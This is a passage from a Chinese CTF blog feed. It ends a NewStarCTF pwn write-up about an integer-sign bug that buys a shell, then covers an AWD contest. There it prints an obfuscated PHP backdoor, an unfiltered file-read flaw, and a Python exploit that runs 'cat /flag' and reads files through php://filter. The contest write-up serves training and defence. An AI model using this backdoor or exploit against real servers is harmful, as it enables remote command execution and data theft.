class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">makemoney</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==========Job list==========&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.McDonald part time job 20$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.MeiTuan takeout        40$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Giving out leaflets    60$&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">if</span> ( hour &lt;= <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You chose McDonald&#x27;s part time job&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;It took you 4hours and earned 20$&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      hour -= <span class="number">4</span>;</span><br><span class="line">      money += <span class="number">20</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( hour &lt;= <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You need to rest&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You chose MeiTuan takeout&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;It took you 8hours and earned 40$&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      hour -= <span class="number">8</span>;</span><br><span class="line">      money += <span class="number">40</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="keyword">if</span> ( hour &gt; <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You chose giving out leaflets&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;It took you 12hours and earned 60$&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        hour -= <span class="number">12</span>;</span><br><span class="line">        money += <span class="number">60</span>;</span><br><span class="line">        <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;nothing here&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dont_try()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">dont_try</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( chance )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You shouldn&#x27;t choose this&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please remember, the shop owner doesn&#x27;t like his secret to be found&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;To punish your choice, you will lose 50$ and you will never be able to choose it!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    money -= <span class="number">50</span>;</span><br><span class="line">    --chance;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸç†ï¼šæœ‰ç¬¦å·å‹è´Ÿæ•°intè½¬åŒ–ä¸ºæ— ç¬¦å·intä¼šå¯¼è‡´æ— ç¬¦å·intæ•°å€¼ç‰¹åˆ«å¤§</p><p>å› æ­¤ï¼Œå…ˆæŠŠæ‰€æœ‰moneyèŠ±å…‰ï¼Œä¹‹åå»dont_try()å‡½æ•°å‡é’±ï¼Œå°†å…¶å˜æˆè´Ÿæ•°ï¼Œå³å¯ä¹°åˆ°shell</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä½œä¸ºæ–°ç”Ÿèµ›ï¼Œè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå¯¹åˆå­¦è€…æ¯”è¾ƒå‹å¥½ã€‚</p><p>è´´ä¸€ä¸ªå®˜æ–¹wpï¼š<a href="https://shimo.im/docs/XKq421EBKzFyRzAN/read">NewStarCTF 2023 Week1 å®˜æ–¹WriteUp (shimo.im)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¥½ä¹…æ²¡ç¢°ctfäº†ï¼Œæ„Ÿè§‰æ‰‹æœ‰ç‚¹ç”Ÿï¼Œæ­£å¥½æœ€è¿‘newstaræ–°ç”Ÿèµ›ï¼Œè¿‡æ¥å‡‘ä¸ªçƒ­é—¹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;p&gt;è§£é¢˜ 7&amp;#x2F;7&lt;/p&gt;
&lt;h3 </summary>
      
    
    
    
    <category term="WriteUp" scheme="https://blog.lazyforever.top/categories/WriteUp/"/>
    
    
    <category term="web" scheme="https://blog.lazyforever.top/tags/web/"/>
    
    <category term="reverse" scheme="https://blog.lazyforever.top/tags/reverse/"/>
    
    <category term="misc" scheme="https://blog.lazyforever.top/tags/misc/"/>
    
    <category term="pwn" scheme="https://blog.lazyforever.top/tags/pwn/"/>
    
    <category term="crypto" scheme="https://blog.lazyforever.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›</title>
    <link href="https://blog.lazyforever.top/2023/09/19/2023tianjindawd/"/>
    <id>https://blog.lazyforever.top/2023/09/19/2023tianjindawd/</id>
    <published>2023-09-19T05:07:18.000Z</published>
    <updated>2023-10-12T10:45:17.619Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>æ­¤æ¬¡æ¯”èµ›è®¾DAWDæ”»é˜²èµ›å’Œåº”æ€¥å“åº”å®æˆ˜åœºæ™¯èµ›ä¸¤ä¸ªèµ›é¢˜ç±»å‹ï¼Œä¸¤ç§èµ›é¢˜åŒæ—¶å¼€èµ›ï¼Œå…¶ä¸­ï¼š</p><p>â‘  DAWDæ”»é˜²èµ›ä¼šæä¾›4ä¸ªæ”»é˜²é¢˜ç›®ç¯å¢ƒï¼Œ2ä¸ªwebé¢˜ç›®ç¯å¢ƒï¼Œ2ä¸ªpwné¢˜ç›®ç¯å¢ƒï¼Œæ¯”èµ›å¼€å§‹æ—¶å…¨éƒ¨å¼€æ”¾ï¼›</p><p>â‘¡ åº”æ€¥å“åº”å®æˆ˜åœºæ™¯èµ›å…±ä¸€ä¸ªåœºæ™¯ï¼Œåœºæ™¯èµ›åŒ…å«å¤šä¸ªé¢˜ç›®ï¼Œæ ¹æ®é—®é¢˜çš„éš¾åº¦ä¼šè®¾ç½®ä¸åŒçš„åˆ†å€¼ï¼Œé€‰æ‰‹å¯ä»¥é€šè¿‡æäº¤ä¸åŒé¢˜ç›®è·å–ç›¸åº”çš„åˆ†å€¼ã€‚</p><h2 id="æ’å"><a href="#æ’å" class="headerlink" title="æ’å"></a>æ’å</h2><p>é˜Ÿä¼åå­— NKV</p><p>DAWDæ”»é˜²èµ›æ’åç¬¬ä¸€</p><img src="/2023/09/19/2023tianjindawd/dawd%E6%8E%92%E5%90%8D.png" class=""><p>åº”æ€¥å“åº”æ’åç¬¬ä¸ƒ</p><img src="/2023/09/19/2023tianjindawd/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8E%92%E5%90%8D.png" class=""><p>æ€»åˆ†ç¬¬ä¸€</p><h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><p>dawdçš„shopé¢˜ç›®æˆ‘ä»¬å®¡è®¡å‡ºäº†ä¸¤ä¸ªæ¼æ´</p><p>ç¬¬ä¸€ä¸ªæ˜¯åœ¨&#x2F;config&#x2F;config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="variable">$_</span>++;</span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&quot;`&quot;</span>^<span class="string">&quot;?&quot;</span>).(<span class="string">&quot;:&quot;</span>^<span class="string">&quot;&#125;&quot;</span>).(<span class="string">&quot;%&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=(<span class="string">&quot;$&quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;-&quot;</span>^<span class="string">&quot;~&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line"></span><br><span class="line">$&#123;<span class="variable">$__</span>&#125;[!<span class="variable">$_</span>]($&#123;<span class="variable">$___</span>&#125;[<span class="variable">$_</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ˜æ˜¾çš„åé—¨ï¼Œç›¸å½“äº<code>$_GET[&#39;0&#39;]($_POST[&#39;1&#39;])</code></p><p>ç›´æ¥<code>system(&#39;cat /flag&#39;)</code>å°±è¡Œ</p><p>å¦ä¸€ä¸ªæ˜¯åœ¨&#x2F;controller&#x2F;index.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexController</span> <span class="keyword">extends</span> <span class="title">medoo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;yestoday&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;before&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="string">&#x27;today&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user_data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$user_data</span>[<span class="string">&#x27;ip&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;AshopToken&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_data</span>)));</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="variable">$datas</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="string">&#x27;cat | ASHOP&#x27;</span>;</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;catid&#x27;</span>] = <span class="variable">$catid</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;cats&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_cats</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>( <span class="variable">$datas</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$date</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;time&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$date</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;today&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;yestoday&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-1 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;before&#x27;</span>:</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">strtotime</span>(<span class="string">&#x27;-2 day&#x27;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_contents</span>( <span class="variable">$time</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>( <span class="variable">$data</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cat_more</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$catid</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$database</span> = <span class="keyword">new</span> <span class="title function_ invoke__">index</span>();</span><br><span class="line"><span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>] = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">cat_contents</span>( <span class="variable">$catid</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$datas</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="comment">//print_r($data);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$database</span>-&gt;<span class="title function_ invoke__">get_more</span>( <span class="variable">$data</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ«å°¾å¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_pic</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$pic</span> = <span class="title function_ invoke__">get</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pic</span> != <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:image/jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$pic</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚æ•°fileç›´æ¥ä½œä¸ºå˜é‡è¿›è¡Œ<code>file_get_contents</code>ï¼Œæ²¡æœ‰å¯¹å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ç›´æ¥<code>?c=index&amp;a=show_pic&amp;file=/flag</code>å°±å¯ä»¥æ‹¿åˆ°flag</p><p>è¿™é‡Œç›´æ¥è´´ä¸Šæˆ‘çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­£åˆ™åŒ¹é…flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span> (<span class="built_in">str</span>):</span><br><span class="line">    pattern = <span class="string">r&#x27;^flag\&#123;.*\&#125;$&#x27;</span></span><br><span class="line">    result = re.<span class="keyword">match</span>(pattern, <span class="built_in">str</span>).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">    PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/config/config.php?0=system&quot;</span></span><br><span class="line">uri=<span class="string">&quot;&quot;</span></span><br><span class="line">target=url+uri</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url2=<span class="string">f&quot;http://<span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>/?c=index&amp;a=show_pic&amp;file=php://filter/resource=/flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a=requests.post(target,data=data)</span><br><span class="line">    <span class="built_in">print</span>(find_flag(a.text))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    a=requests.post(url2)</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">str</span>(a.text)[-<span class="number">43</span>:-<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>patchä¹Ÿè´´ä¸Š</p><p>patch.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">python3 patch.py </span><br><span class="line">cp index.class.php /var/www/html/controller/index.class.php</span><br></pre></td></tr></table></figure><p>index.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 